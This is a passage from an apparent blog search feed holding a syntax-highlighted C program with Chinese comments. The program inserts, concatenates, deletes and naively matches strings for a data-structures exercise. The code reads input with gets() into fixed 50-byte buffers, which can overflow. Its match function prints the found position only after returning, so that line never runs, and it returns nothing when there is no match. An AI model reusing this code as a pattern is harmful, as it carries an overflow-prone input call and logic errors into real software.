l<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">pipei</span><span class="token punctuation">(</span>string <span class="token operator">*</span>s<span class="token punctuation">,</span>string <span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> s<span class="token operator">-></span>length<span class="token operator">&amp;&amp;</span>j <span class="token operator">&lt;</span> p<span class="token operator">-></span>length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token operator">-></span>ch<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> p<span class="token operator">-></span>ch<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>i<span class="token operator">++</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>i <span class="token operator">=</span> i <span class="token operator">-</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">>=</span> p<span class="token operator">-></span>length<span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"在第%d位\n"</span><span class="token punctuation">,</span>i <span class="token operator">-</span> p<span class="token operator">-></span>length <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//返回第一个字符的位置</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"第一串字符串:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">gets</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"第二串字符串:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">gets</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>string s<span class="token punctuation">;</span>string t<span class="token punctuation">;</span><span class="token function">csh</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">csh</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strassign</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//给字符串s赋值</span><span class="token function">strassign</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>t<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//给字符串t赋值</span><span class="token keyword">int</span> c<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"需要插入的位置："</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strinsert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span>c<span class="token punctuation">,</span><span class="token operator">&amp;</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//插入第一串指定位置</span><span class="token function">strinput</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//输出插入后的字符串</span><span class="token function">strca</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span><span class="token operator">&amp;</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//拼接字符串</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>string x<span class="token punctuation">;</span><span class="token function">csh</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>l<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"输入删除的位置："</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"输入删除的长度："</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>l<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strdel</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span><span class="token operator">&amp;</span>x<span class="token punctuation">,</span>n<span class="token punctuation">,</span>l<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strinput</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strinput</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> q<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>string p<span class="token punctuation">;</span><span class="token function">csh</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strassign</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pipei</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span><span class="token operator">&amp;</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> C programs </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
